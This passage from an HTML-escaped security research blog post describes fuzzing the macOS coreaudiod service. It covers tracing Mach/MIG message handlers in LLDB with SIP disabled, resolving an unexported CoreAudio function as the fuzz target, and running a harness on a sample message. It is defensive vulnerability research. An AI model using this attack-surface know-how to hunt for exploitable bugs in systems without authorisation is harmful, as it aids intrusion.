 &lt;p class=&quot;VEfNEQsFFH-c13&quot;&gt;&lt;span&gt;I further confirmed this by setting an LLDB breakpoint on the &lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c1&quot;&gt;coreaudiod&lt;/span&gt;&lt;span&gt;&amp;nbsp;process (after &lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c0&quot;&gt;&lt;a href=&quot;https://conference.hitb.org/hitbsecconf2021sin/materials/D2T1%2520-%2520Summer%2520of%2520Fuzz%2520-%2520MacOS%2520-%2520Jeremy%2520Brown.pdf#page=11&quot;&gt;disabling SIP&lt;/a&gt;&lt;/span&gt;) for the &lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c1&quot;&gt;_HALB_MIGServer_server&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c4&quot;&gt;&amp;nbsp;function. Then, I adjusted the volume on my system, and the breakpoint was hit:&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;VEfNEQsFFH-c13&quot;&gt;&lt;span class=&quot;VEfNEQsFFH-c4&quot;&gt;&lt;a href=&quot;https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhELEOdWHq7Ft96l7KMBc2dCdGCtqpsullrNC7VuwtFFnSiUQiVCXZDsEqT2UkRQXS3u1tmKXOY6bbyWqkSLpn2XNIaqM8jFzXjtQbK89IwbXhbWuFna7OfqS4GXNNsl1wJY7S_6Y9j61KuqwFZVT9Ti2TZf7_NTaJKzRCq-sad0bUGm_R49og5suC7JeE/s1999/image7.png&quot; style=&quot;display: block; padding: 1em 0;text-align: center;&quot;&gt;&lt;img src=&quot;https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhELEOdWHq7Ft96l7KMBc2dCdGCtqpsullrNC7VuwtFFnSiUQiVCXZDsEqT2UkRQXS3u1tmKXOY6bbyWqkSLpn2XNIaqM8jFzXjtQbK89IwbXhbWuFna7OfqS4GXNNsl1wJY7S_6Y9j61KuqwFZVT9Ti2TZf7_NTaJKzRCq-sad0bUGm_R49og5suC7JeE/s1200/image7.png&quot; border=&quot;0&quot; alt=&quot;A debugger lldb window showing a breakpoint hit in CoreAudio_HALB_MIGServer_server. The process is stopped at the beginning of this function, with the instruction push rbp highlighted. The thread information indicates the queue is com.apple.audio.device.BuiltInSpeakerDevice.event&quot; style=&quot;max-height: 750px; max-width: 600px;&quot;title=&quot;A debugger lldb window showing a breakpoint hit in CoreAudio_HALB_MIGServer_server. The process is stopped at the beginning of this function, with the instruction push rbp highlighted. The thread information indicates the queue is com.apple.audio.device.BuiltInSpeakerDevice.event&quot; /&gt;&lt;/a&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;VEfNEQsFFH-c13&quot;&gt;&lt;span&gt;In this example, tracing the message handler called from the MIG subsystem showed the &lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c1&quot;&gt;_XObject_HasProperty&lt;/span&gt;&lt;span&gt;&amp;nbsp;function was called based on the Mach message&amp;rsquo;s &lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c1&quot;&gt;msgh_id&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c4&quot;&gt;.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;VEfNEQsFFH-c13&quot;&gt;&lt;span&gt;&lt;a href=&quot;https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgnYEZ1TANwU_JIy3Jcg2aD65ggtouIAA_no-EXMwsKjtQA1MzVcb0GqYXZGGzWbQxC9-1hF_DsAE1U17ExEB2DypVrFvPnzsc8fF5SpHaVRcqlfpiw9Lmr-_gyto8HMQV4EajZ8sIepyvOHSwercDK1KhjJYvpwneUHxeKMj3Q_fxnNez-Z4c_3b9XDFI/s1999/image4.png&quot; style=&quot;display: block; padding: 1em 0;text-align: center;&quot;&gt;&lt;img src=&quot;https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgnYEZ1TANwU_JIy3Jcg2aD65ggtouIAA_no-EXMwsKjtQA1MzVcb0GqYXZGGzWbQxC9-1hF_DsAE1U17ExEB2DypVrFvPnzsc8fF5SpHaVRcqlfpiw9Lmr-_gyto8HMQV4EajZ8sIepyvOHSwercDK1KhjJYvpwneUHxeKMj3Q_fxnNez-Z4c_3b9XDFI/s1200/image4.png&quot; border=&quot;0&quot; alt=&quot;A debugger lldb window showing two states of a stopped process. The first state shows the process stopped at a call rcx instruction within CoreAudio_HALB_MIGServer_server. After a step into si command, the second state shows the process stopped at the beginning of CoreAudio__XObject_HasProperty, as indicated by the red arrow and highlighted function name.&quot; style=&quot;max-height: 750px; max-width: 600px;&quot;title=&quot;A debugger lldb window showing two states of a stopped process. The first state shows the process stopped at a call rcx instruction within CoreAudio_HALB_MIGServer_server. After a step into si command, the second state shows the process stopped at the beginning of CoreAudio__XObject_HasProperty, as indicated by the red arrow and highlighted function name.&quot; /&gt;&lt;/a&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;VEfNEQsFFH-c13&quot;&gt;&lt;span&gt;Depending on the &lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c1&quot;&gt;msgh_id&lt;/span&gt;&lt;span&gt;, a few dozen message handlers were accessible from the MIG subsystem. They are easily identifiable by the convenient &lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c1&quot;&gt;__X&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c4&quot;&gt;&amp;nbsp;prefix to their function names added by MIG.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;VEfNEQsFFH-c13&quot;&gt;&lt;span class=&quot;VEfNEQsFFH-c4&quot;&gt;&lt;a href=&quot;https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhTXFjbk_Ympt44H8PzvXqxm1T3nXRyS7o5MoyrODDxABuctGZ5_MreHZ9AhORYOZbY1iYg76OUU1T0c4dTgHW_Jn48xm8JsdhZNVPqH6zCfuS0VulO3e64pbIvINkLFu_0-cWdEE8tgTulS_KN-9T7CSdKggVWsIK0WT0dhjitv9vMFlWTIvXaX0nf9V8/s862/image2.png&quot; style=&quot;display: block; padding: 1em 0;text-align: center;&quot;&gt;&lt;img src=&quot;https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhTXFjbk_Ympt44H8PzvXqxm1T3nXRyS7o5MoyrODDxABuctGZ5_MreHZ9AhORYOZbY1iYg76OUU1T0c4dTgHW_Jn48xm8JsdhZNVPqH6zCfuS0VulO3e64pbIvINkLFu_0-cWdEE8tgTulS_KN-9T7CSdKggVWsIK0WT0dhjitv9vMFlWTIvXaX0nf9V8/s862/image2.png&quot; border=&quot;0&quot; alt=&quot;A list of function names, likely from a software library or framework, related to object and system context management. Each function name is prefixed with an f icon and highlighted in red, possibly indicating they are of interest for analysis or have been patched. Examples include __XObject_PropertyListener, __XIOContext_PauseIO, __XSystem_CreateIOContext, and __XObject_HasProperty.&quot; style=&quot;max-height: 350px; max-width: 400px;&quot;title=&quot;A list of function names, likely from a software library or framework, related to object and system context management. Each function name is prefixed with an f icon and highlighted in red, possibly indicating they are of interest for analysis or have been patched. Examples include __XObject_PropertyListener, __XIOContext_PauseIO, __XSystem_CreateIOContext, and __XObject_HasProperty.&quot; /&gt;&lt;/a&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;VEfNEQsFFH-c13&quot;&gt;&lt;span&gt;The &lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c1&quot;&gt;_HALB_MIGServer_server&lt;/span&gt;&lt;span&gt;&amp;nbsp;function struck a great balance between getting close to low-level message handling code while still resembling the inputs that a call to &lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c1&quot;&gt;mach_msg&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c4&quot;&gt;&amp;nbsp;would take. I decided this was the place to inject fuzz input into.&lt;/span&gt;&lt;/p&gt;&lt;h2 class=&quot;VEfNEQsFFH-c8&quot; id=&quot;h.ijqryrwnuc9y&quot;&gt;&lt;span class=&quot;VEfNEQsFFH-c16 VEfNEQsFFH-c15&quot;&gt;Creating a Basic Fuzzing Harness&lt;/span&gt;&lt;/h2&gt;
 &lt;p class=&quot;VEfNEQsFFH-c13&quot;&gt;&lt;span&gt;After identifying the function I wanted to fuzz, the next step was to write a program to read a file and deliver the file&amp;rsquo;s contents as input to the target function. This might have been as easy as linking the &lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c1&quot;&gt;CoreAudio&lt;/span&gt;&lt;span&gt;&amp;nbsp;library with my fuzzing harness and calling the &lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c1&quot;&gt;_HALB_MIGServer_server&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c4&quot;&gt;&amp;nbsp;function, but unfortunately the function was not exported.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;VEfNEQsFFH-c13&quot;&gt;&lt;span&gt;Instead, I borrowed some logic from &lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c0&quot;&gt;&lt;a href=&quot;https://x.com/ifsecure&quot;&gt;Ivan Fratric&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;and his &lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c0&quot;&gt;&lt;a href=&quot;https://github.com/googleprojectzero/TinyInst/&quot;&gt;TinyInst&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;tool (we&amp;rsquo;ll be talking about it a lot more later) which &lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c0&quot;&gt;&lt;a href=&quot;https://github.com/googleprojectzero/TinyInst/blob/fb1cceb7ec3c44cb18c4c01685e496777e0bcdc9/macOS/debugger.cpp#L1169&quot;&gt;returns a provided symbol&amp;rsquo;s address&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;from a library. The code parses the structure of &lt;/span&gt;&lt;span&gt;Mach-O binaries, specifically their headers and load commands, to locate and extract symbol information&lt;/span&gt;&lt;span&gt;. This made it possible to &lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c0&quot;&gt;&lt;a href=&quot;https://github.com/googleprojectzero/p0tools/blob/master/CoreAudioFuzz/helpers/initialization.cc&quot;&gt;resolve and call the target function in my fuzzing harness&lt;/a&gt;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c4&quot;&gt;, even when it wasn&amp;rsquo;t exported.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;VEfNEQsFFH-c13&quot;&gt;&lt;span&gt;So, the high level function of my harness was as &lt;/span&gt;&lt;span&gt;follows&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c4&quot;&gt;:&lt;/span&gt;&lt;/p&gt;&lt;ol class=&quot;lst-kix_csck9rydgkh1-0 start&quot; start=&quot;1&quot;&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c13 c14 li-bullet-0&quot;&gt;&lt;span&gt;Load the &lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c1&quot;&gt;CoreAudio&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c4&quot;&gt;&amp;nbsp;Library&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c13 c14 li-bullet-0&quot;&gt;&lt;span&gt;Get a function pointer for the target function from the &lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c1&quot;&gt;CoreAudio&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c4&quot;&gt;&amp;nbsp;Library&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c13 c14 li-bullet-0&quot;&gt;&lt;span class=&quot;VEfNEQsFFH-c4&quot;&gt;Read an input from a file&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c13 c14 li-bullet-0&quot;&gt;&lt;span class=&quot;VEfNEQsFFH-c4&quot;&gt;Call the target function with the input&lt;/span&gt;&lt;/li&gt;&lt;/ol&gt;
 &lt;p class=&quot;VEfNEQsFFH-c13&quot; style=&quot;padding-top: 10pt&quot;&gt;&lt;span&gt;The full implementation of my fuzzing harness can be found &lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c0&quot;&gt;&lt;a href=&quot;https://github.com/googleprojectzero/p0tools/blob/master/CoreAudioFuzz/harness.mm&quot;&gt;here&lt;/a&gt;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c4&quot;&gt;. An example of invoking the harness to send a message from an input file is shown below:&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;VEfNEQsFFH-c10&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c3&quot;&gt;$ ./harness&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c3&quot;&gt;-f&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c3&quot;&gt;corpora/basic/1&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c3&quot;&gt;-v&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;VEfNEQsFFH-c10 VEfNEQsFFH-c18&quot;&gt;&lt;span class=&quot;VEfNEQsFFH-c12 VEfNEQsFFH-c2&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;VEfNEQsFFH-c10&quot;&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c3&quot;&gt;*******NEW&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c3&quot;&gt;MESSAGE*******&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;VEfNEQsFFH-c10&quot;&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c3&quot;&gt;Message&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c3&quot;&gt;ID:&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c3&quot;&gt;1010000&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c3&quot;&gt;(XSystem_Open)&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;VEfNEQsFFH-c10&quot;&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c3&quot;&gt;------&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c3&quot;&gt;MACH&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c3&quot;&gt;MSG&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c3&quot;&gt;HEADER&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c3&quot;&gt;------&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;VEfNEQsFFH-c10&quot;&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c3&quot;&gt;msg_bits:&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c3&quot;&gt;2319532353&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;VEfNEQsFFH-c10&quot;&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c3&quot;&gt;msg_size:&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c3&quot;&gt;56&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;VEfNEQsFFH-c10&quot;&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c3&quot;&gt;msg_remote_port:&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c3&quot;&gt;1094795585&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;VEfNEQsFFH-c10&quot;&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c3&quot;&gt;msg_local_port:&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c3&quot;&gt;1094795585&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;VEfNEQsFFH-c10&quot;&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c3&quot;&gt;msg_voucher_port:&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c3&quot;&gt;1094795585&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;VEfNEQsFFH-c10&quot;&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c3&quot;&gt;msg_id:&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c15 VEfNEQsFFH-c3&quot;&gt;1010000&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;VEfNEQsFFH-c10 VEfNEQsFFH-c18&quot;&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c15 VEfNEQsFFH-c3&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;VEfNEQsFFH-c10&quot;&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c3&quot;&gt;------&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c3&quot;&gt;MACH&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c3&quot;&gt;MSG&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c3&quot;&gt;BODY&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c3&quot;&gt;(32&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c3&quot;&gt;bytes)&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c3&quot;&gt;------&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;VEfNEQsFFH-c10&quot;&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c3&quot;&gt;0x01&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c3&quot;&gt;0x00&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c3&quot;&gt;0x00&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c3&quot;&gt;0x00&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c3&quot;&gt;0x03&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c3&quot;&gt;0x30&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c3&quot;&gt;0x00&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c3&quot;&gt;0x00&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c3&quot;&gt;0x41&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c3&quot;&gt;0x41&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c3&quot;&gt;0x41&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c3&quot;&gt;0x41&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c3&quot;&gt;0x41&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c3&quot;&gt;0x41&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c3&quot;&gt;0x11&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c3&quot;&gt;0x00&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c3&quot;&gt;0x41&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c3&quot;&gt;0x41&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c3&quot;&gt;0x00&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c3&quot;&gt;0x00&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c3&quot;&gt;0x00&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c3&quot;&gt;0x00&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c3&quot;&gt;0x00&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c3&quot;&gt;0x00&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c3&quot;&gt;0x00&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c3&quot;&gt;0x00&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c3&quot;&gt;0x00&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c3&quot;&gt;0x00&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c3&quot;&gt;0x00&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c3&quot;&gt;0x00&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c3&quot;&gt;0x00&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c15 VEfNEQsFFH-c3&quot;&gt;0x00&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;VEfNEQsFFH-c10&quot;&gt;&lt;span class=&quot;VEfNEQsFFH-c12 VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;VEfNEQsFFH-c10&quot;&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c3&quot;&gt;------&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c3&quot;&gt;MACH&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c3&quot;&gt;MSG&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c3&quot;&gt;TRAILER&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c3&quot;&gt;------&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;VEfNEQsFFH-c10&quot;&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c3&quot;&gt;msg_trailer_type:&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c3&quot;&gt;0&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;VEfNEQsFFH-c10&quot;&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c3&quot;&gt;msg_trailer_size:&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;VEfNEQsFFH-c2 VEfNEQsFFH-c3&quot;&gt;32&lt;/span&gt;&lt;/p&gt;
